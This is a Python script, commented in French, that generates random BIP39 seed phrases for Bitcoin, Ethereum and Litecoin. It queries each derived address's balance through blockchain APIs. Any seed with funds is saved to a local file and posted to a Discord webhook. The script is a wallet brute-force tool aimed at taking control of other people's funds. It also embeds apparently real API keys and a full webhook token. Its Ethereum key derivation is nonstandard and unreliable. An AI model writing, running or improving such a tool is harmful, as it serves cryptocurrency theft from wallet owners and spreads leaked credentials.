# Imports - Bibliothèques standard
import time
import threading

# Imports - Bibliothèques tierces
import requests

# Imports - Bibliothèques spécifiques pour la cryptographie
from mnemonic import Mnemonic
from eth_account import Account
from bitcoinlib.keys import HDKey

# Configuration
CONFIG = {
    "LANGUAGE": "english",
    "ETHERSCAN_API_KEY": "TZN2C35KYMNWT2BERKBMKHCU3S15EFZUBP",
    "ALCHEMY_API_KEY": "NJAxc_J5MQQk8G7tqK-hQTZWx9LjUHRt",
    "BLOCKCYPHER_API_KEY": "609a9840d7a545d598af7c4dbed76171",
    "TARGET_PER_SECOND": 10,
    "WEBHOOK_URL": "https://discord.com/api/webhooks/1355181810543231176/G8hPPUlOxV0D_SBgB5VNgHbl2AqSsoQspn2bWfalSRNJWT-haJFaIgeI1Uw4jzoHiaFQ",  # Remplacez par l'URL de votre webhook Discord
    "ALCHEMY_URL": "https://eth-mainnet.g.alchemy.com/v2/NJAxc_J5MQQk8G7tqK-hQTZWx9LjUHRt"
}

class SeedGenerator:
    def __init__(self):
        self.mnemo = Mnemonic(CONFIG["LANGUAGE"])
        self.running_btc = False
        self.running_eth = False
        self.running_ltc = False

    # Méthodes utilitaires
    def generate_seed(self):
        """Génère une seed phrase valide."""
        return self.mnemo.generate(strength=128)

    def is_valid_seed(self, seed_phrase):
        """Vérifie la validité d'une seed phrase."""
        try:
            self.mnemo.to_seed(seed_phrase)
            return True
        except Exception:
            return False

    def send_webhook_message(self, message):
        """Envoie un message via le webhook Discord."""
        try:
            payload = {
                "content": message,
                "username": "Seed Generator",
                "avatar_url": "https://i.imgur.com/4M34hi2.png"
            }
            response = requests.post(CONFIG["WEBHOOK_URL"], json=payload)
            if response.status_code != 204:
                print(f"Erreur lors de l'envoi du message au webhook : {response.status_code} - {response.text}")
        except Exception as e:
            print(f"Erreur lors de l'envoi du message au webhook : {e}")

    # Méthodes pour récupérer les adresses et soldes
    def get_btc_address_and_balance(self, seed_phrase):
        """Dérive une adresse BTC et vérifie son solde."""
        try:
            seed = self.mnemo.to_seed(seed_phrase)
            hd_key = HDKey.from_seed(seed, network='bitcoin')
            address = hd_key.address()
            url = f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/balance?token={CONFIG['BLOCKCYPHER_API_KEY']}"
            response = requests.get(url)
            data = response.json()
            balance_sat = data.get("final_balance", 0)
            return address, balance_sat / 10**8
        except Exception as e:
            print(f"Erreur BTC: {e}")
            return None, None

    def get_eth_address_and_balance(self, seed_phrase):
        """Dérive une adresse ETH et vérifie son solde."""
        try:
            seed = self.mnemo.to_seed(seed_phrase)
            account = Account.from_key(seed[:32])
            address = account.address
            balance = self.get_balance_etherscan(address) or self.get_balance_alchemy(address)
            return address, balance if balance is not None else 0
        except Exception as e:
            print(f"Erreur ETH: {e}")
            return None, None

    def get_ltc_address_and_balance(self, seed_phrase):
        """Dérive une adresse LTC et vérifie son solde."""
        try:
            seed = self.mnemo.to_seed(seed_phrase)
            hd_key = HDKey.from_seed(seed, network='litecoin')
            address = hd_key.address()
            url = f"https://api.blockcypher.com/v1/ltc/main/addrs/{address}/balance?token={CONFIG['BLOCKCYPHER_API_KEY']}"
            response = requests.get(url)
            data = response.json()
            balance_sat = data.get("final_balance", 0)
            return address, balance_sat / 10**8
        except Exception as e:
            print(f"Erreur LTC: {e}")
            return None, None

    def get_balance_etherscan(self, address):
        """Vérifie le solde ETH via Etherscan."""
        try:
            url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={CONFIG['ETHERSCAN_API_KEY']}"
            response = requests.get(url)
            data = response.json()
            if data["status"] == "1":
                return int(data["result"]) / 10**18
            return 0
        except Exception as e:
            print(f"Erreur Etherscan: {e}")
            return None

    def get_balance_alchemy(self, address):
        """Vérifie le solde ETH via Alchemy."""
        try:
            payload = {"jsonrpc": "2.0", "method": "eth_getBalance", "params": [address, "latest"], "id": 1}
            response = requests.post(CONFIG["ALCHEMY_URL"], json=payload)
            data = response.json()
            if "result" in data:
                return int(data["result"], 16) / 10**18
            return 0
        except Exception as e:
            print(f"Erreur Alchemy: {e}")
            return None

    # Méthodes de génération de seed phrases
    def generate_seeds_btc(self):
        """Génère et vérifie des seed phrases pour BTC."""
        while self.running_btc:
            start_time = time.time()
            for _ in range(CONFIG["TARGET_PER_SECOND"]):
                if not self.running_btc:
                    break
                seed_phrase = self.generate_seed()
                is_valid = self.is_valid_seed(seed_phrase)
                address, balance = self.get_btc_address_and_balance(seed_phrase)

                result = f"BTC: {seed_phrase} - Valide: {is_valid}"
                if address:
                    result += f" - Adresse: {address} - Solde: {balance if balance is not None else 0} BTC"
                    if balance is not None and isinstance(balance, (int, float)) and balance > 0:
                        result += " - **!!! FONDS TROUVÉS !!!**"
                        with open("found_seeds.txt", "a") as f:
                            f.write(f"BTC: {seed_phrase} - {address} - {balance} BTC\n")
                        self.send_webhook_message(result)
                print(result)
                time.sleep(0.1)

            elapsed = time.time() - start_time
            if elapsed < 1.0:
                time.sleep(1.0 - elapsed)

    def generate_seeds_eth(self):
        """Génère et vérifie des seed phrases pour ETH."""
        while self.running_eth:
            start_time = time.time()
            for _ in range(CONFIG["TARGET_PER_SECOND"]):
                if not self.running_eth:
                    break
                seed_phrase = self.generate_seed()
                is_valid = self.is_valid_seed(seed_phrase)
                address, balance = self.get_eth_address_and_balance(seed_phrase)

                result = f"ETH: {seed_phrase} - Valide: {is_valid}"
                if address:
                    result += f" - Adresse: {address} - Solde: {balance if balance is not None else 0} ETH"
                    if balance is not None and isinstance(balance, (int, float)) and balance > 0:
                        result += " - **!!! FONDS TROUVÉS !!!**"
                        with open("found_seeds.txt", "a") as f:
                            f.write(f"ETH: {seed_phrase} - {address} - {balance} ETH\n")
                        self.send_webhook_message(result)
                print(result)
                time.sleep(0.1)

            elapsed = time.time() - start_time
            if elapsed < 1.0:
                time.sleep(1.0 - elapsed)

    def generate_seeds_ltc(self):
        """Génère et vérifie des seed phrases pour LTC."""
        while self.running_ltc:
            start_time = time.time()
            for _ in range(CONFIG["TARGET_PER_SECOND"]):
                if not self.running_ltc:
                    break
                seed_phrase = self.generate_seed()
                is_valid = self.is_valid_seed(seed_phrase)
                address, balance = self.get_ltc_address_and_balance(seed_phrase)

                result = f"LTC: {seed_phrase} - Valide: {is_valid}"
                if address:
                    result += f" - Adresse: {address} - Solde: {balance if balance is not None else 0} LTC"
                    if balance is not None and isinstance(balance, (int, float)) and balance > 0:
                        result += " - **!!! FONDS TROUVÉS !!!**"
                        with open("found_seeds.txt", "a") as f:
                            f.write(f"LTC: {seed_phrase} - {address} - {balance} LTC\n")
                        self.send_webhook_message(result)
                print(result)
                time.sleep(0.1)

            elapsed = time.time() - start_time
            if elapsed < 1.0:
                time.sleep(1.0 - elapsed)

    def start_all(self):
        """Démarre la génération pour BTC, ETH, et LTC."""
        self.running_btc = True
        self.running_eth = True
        self.running_ltc = True
        threading.Thread(target=self.generate_seeds_btc, daemon=True).start()
        threading.Thread(target=self.generate_seeds_eth, daemon=True).start()
        threading.Thread(target=self.generate_seeds_ltc, daemon=True).start()

# Point d'entrée principal
if __name__ == "__main__":
    generator = SeedGenerator()
    generator.start_all()
    while True:
        time.sleep(1)  # Boucle infinie pour garder le script actif
